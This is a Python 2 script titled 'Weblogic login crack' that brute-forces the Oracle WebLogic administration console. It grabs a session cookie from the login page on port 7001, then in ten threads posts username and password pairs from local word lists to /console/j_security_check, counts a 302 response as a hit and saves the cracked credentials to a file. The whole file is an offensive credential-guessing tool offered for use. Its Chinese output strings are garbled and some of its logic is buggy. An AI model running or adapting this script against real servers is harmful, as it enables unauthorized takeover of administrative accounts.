#/usr/bin python
# -*- coding: cp936 -*-
import httplib,urllib,sys,os
import threading
import Queue
import re
def info():
    print '''

=========================================
            Weblogic login crack

              uage:xx.py url

          WelCome to www.paxmac.org    

                         By: ����������ϧ
                           Pax.Mac Team
=========================================

    '''
if len(sys.argv) < 2:
    info()
else:
    url=sys.argv[1]
    info()
    uname_count = len(open('uname.txt','rU').readlines())
    print '����˺�������%d'%(uname_count)
    pwd_count = len(open('pwd.txt','rU').readlines())
    print '�������������%d'%(pwd_count)
    print '�����ƽ�........'
    conn = httplib.HTTPConnection(url,7001)
    conn.request("GET",'/console/login/LoginForm.jsp')
    cookie=conn.getresponse().getheaders()
    string=str(cookie[1])
    pattern = re.compile(r'ADMINCONSOLESESSION=(.*);')
    match = pattern.search(string)
    if match:
        cookie=match.group()

queue=Queue.Queue()#����һ�����ж���

success=[]
class ThreadUrl(threading.Thread):
   def __init__(self,queue):
      threading.Thread.__init__(self)
      self.queue=queue
   def run(self):
       while True:
           try:
               if(Queue.Empty):
                   pwd=self.queue.get()
               else:
                    break
               params = urllib.urlencode({'j_username':LOG,
                          'j_password':pwd
                           })
               headers = {"Content-Type":"application/x-www-form-urlencoded",
                   "Connection":"Keep-Alive","Cookie":cookie}
               conn = httplib.HTTPConnection(url,7001)
               conn.request(method="POST",url='/console/j_security_check',body=params,headers=headers)
               response = conn.getresponse()
               if response.status == 302:
                   final="�ƽ�ɹ�!^_^!�˺ţ�%s���룺%s"%(LOG,pwd)
                   print final
                   success.append(final)
               else:
                    conn.close()
           except:
                print '���ӳ�ʱ'
           self.queue.task_done()

def main():
    for i in range(10):
        t=ThreadUrl(queue)
        t.setDaemon(True)
        t.start()
    names = [line.rstrip() for line in open("uname.txt")]
    pwds = [line.rstrip() for line in open("pwd.txt")]
    for log in names:
        global LOG
        LOG=''
        LOG=log
        for pwd in pwds:
            p=pwd
            queue.put(p)
        queue.join()
if __name__ == '__main__':
    main()
    txt=('%s.txt')%(sys.argv[1])
    for x in success:
        file=open(txt,'w')
        file.write(x)
    file.close()